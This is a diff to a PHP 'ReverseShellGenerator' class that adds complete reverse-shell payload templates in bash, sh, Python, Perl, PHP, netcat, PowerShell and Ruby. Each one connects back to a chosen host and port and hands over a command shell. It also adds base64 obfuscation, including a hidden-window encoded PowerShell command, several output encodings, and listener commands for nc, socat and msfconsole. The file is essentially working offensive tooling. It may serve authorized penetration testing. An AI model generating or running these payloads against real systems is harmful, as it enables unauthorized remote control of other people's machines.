@@ -707,30 +707,169 @@ class ReverseShellGenerator {
         return $port >= 1 && $port <= 65535;
     }
 
-    public static function generate($shell_type, $lhost, $lport, $encoding, $options = []) {
-        return [
+    private static function build_payload($shell_type, $lhost, $lport, $options = array()) {
+        $obfuscate = isset($options['obfuscate']) ? $options['obfuscate'] : false;
+        $nc_type = isset($options['nc_type']) ? $options['nc_type'] : 'standard';
+
+        switch ($shell_type) {
+            case 'bash':
+                $payload = "bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";
+                if ($obfuscate) {
+                    $payload = "/bin/bash -c 'bash -i >& /dev/tcp/{$lhost}/{$lport} 0>&1'";
+                }
+                return $payload;
+
+            case 'sh':
+                return "sh -i >& /dev/tcp/{$lhost}/{$lport} 0>&1";
+
+            case 'python':
+                $p = "import socket,subprocess,os;"
+                   . "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                   . "s.connect((\"{$lhost}\",{$lport}));"
+                   . "os.dup2(s.fileno(),0);"
+                   . "os.dup2(s.fileno(),1);"
+                   . "os.dup2(s.fileno(),2);"
+                   . "subprocess.call([\"/bin/sh\",\"-i\"])";
+                if ($obfuscate) {
+                    return "python -c 'exec(__import__(\"base64\").b64decode(\"" . base64_encode($p) . "\"))'";
+                }
+                return "python -c '{$p}'";
+
+            case 'python3':
+                $p = "import socket,subprocess,os;"
+                   . "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                   . "s.connect((\"{$lhost}\",{$lport}));"
+                   . "os.dup2(s.fileno(),0);"
+                   . "os.dup2(s.fileno(),1);"
+                   . "os.dup2(s.fileno(),2);"
+                   . "subprocess.call([\"/bin/sh\",\"-i\"])";
+                if ($obfuscate) {
+                    return "python3 -c 'exec(__import__(\"base64\").b64decode(\"" . base64_encode($p) . "\"))'";
+                }
+                return "python3 -c '{$p}'";
+
+            case 'perl':
+                $p = "use Socket;"
+                   . "\$i=\"{$lhost}\";\$p={$lport};"
+                   . "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                   . "if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){"
+                   . "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
+                   . "exec(\"/bin/sh -i\");}";
+                return "perl -e '{$p}'";
+
+            case 'php':
+                $p = "\$sock=fsockopen(\"{$lhost}\",{$lport});"
+                   . "\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);";
+                return "php -r '{$p}'";
+
+            case 'nc':
+                switch ($nc_type) {
+                    case 'ncat':
+                        return "ncat {$lhost} {$lport} -e /bin/sh";
+                    case 'openbsd':
+                        return "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$lhost} {$lport} >/tmp/f";
+                    default:
+                        return "nc -e /bin/sh {$lhost} {$lport}";
+                }
+
+            case 'powershell':
+                $p = "\$client=New-Object System.Net.Sockets.TCPClient('{$lhost}',{$lport});"
+                   . "\$stream=\$client.GetStream();"
+                   . "[byte[]]\$bytes=0..65535|%{0};"
+                   . "while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){"
+                   . "\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);"
+                   . "\$sendback=(iex \$data 2>&1|Out-String);"
+                   . "\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';"
+                   . "\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);"
+                   . "\$stream.Write(\$sendbyte,0,\$sendbyte.Length);"
+                   . "\$stream.Flush()};"
+                   . "\$client.Close()";
+                if ($obfuscate) {
+                    $encoded = base64_encode(mb_convert_encoding($p, 'UTF-16LE', 'UTF-8'));
+                    return "powershell -nop -w hidden -enc {$encoded}";
+                }
+                return "powershell -nop -c \"{$p}\"";
+
+            case 'ruby':
+                $p = "require 'socket';"
+                   . "f=TCPSocket.open(\"{$lhost}\",{$lport}).to_i;"
+                   . "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)";
+                return "ruby -e '{$p}'";
+
+            default:
+                return '';
+        }
+    }
+
+    private static function encode_payload($payload, $encoding) {
+        switch ($encoding) {
+            case 'base64':
+                return base64_encode($payload);
+            case 'urlencode':
+                return urlencode($payload);
+            case 'hex':
+                return bin2hex($payload);
+            default:
+                return $payload;
+        }
+    }
+
+    public static function generate($shell_type, $lhost, $lport, $encoding, $options = array()) {
+        $payload = self::build_payload($shell_type, $lhost, $lport, $options);
+
+        if (empty($payload)) {
+            return array(
+                'success' => false,
+                'error' => 'Unsupported shell type: ' . $shell_type
+            );
+        }
+
+        $encoded = ($encoding !== 'none')
+            ? self::encode_payload($payload, $encoding)
+            : $payload;
+
+        return array(
             'success' => true,
             'shell_type' => $shell_type,
             'lhost' => $lhost,
             'lport' => $lport,
-            'payload' => ''
-        ];
+            'encoding' => $encoding,
+            'original' => $payload,
+            'encoded' => $encoded
+        );
     }
 
     public static function generate_listener($listener_type, $listener_port) {
-        return 'nc -lvnp ' . intval($listener_port);
+        $port = intval($listener_port);
+
+        switch ($listener_type) {
+            case 'nc':
+                return "nc -lvnp {$port}";
+            case 'ncat':
+                return "ncat -lvnp {$port}";
+            case 'socat':
+                return "socat TCP-LISTEN:{$port},reuseaddr,fork EXEC:/bin/sh";
+            case 'msfconsole':
+                return "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {$port}; exploit\"";
+            case 'bash':
+                return "while true; do nc -lvnp {$port}; done";
+            case 'python':
+                return "python3 -c 'import socket,sys;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((\"0.0.0.0\",{$port}));s.listen(1);print(\"Listening on 0.0.0.0:{$port}\");c,a=s.accept();print(\"Connection from\",a);sys.stdin=c.makefile(\"r\");sys.stdout=c.makefile(\"w\");sys.stderr=c.makefile(\"w\")'";
+            default:
+                return "nc -lvnp {$port}";
+        }
     }
 
     public static function get_shell_types() {
-        return ['bash', 'sh', 'cmd', 'powershell', 'nc'];
+        return array('bash', 'sh', 'python', 'python3', 'perl', 'php', 'nc', 'powershell', 'ruby');
     }
 
     public static function get_encodings() {
-        return ['none', 'base64', 'url'];
+        return array('none', 'base64', 'urlencode', 'hex');
     }
 
     public static function get_listeners() {
-        return ['nc', 'socat'];
+        return array('nc', 'ncat', 'socat', 'msfconsole', 'bash', 'python');
     }
 }
 
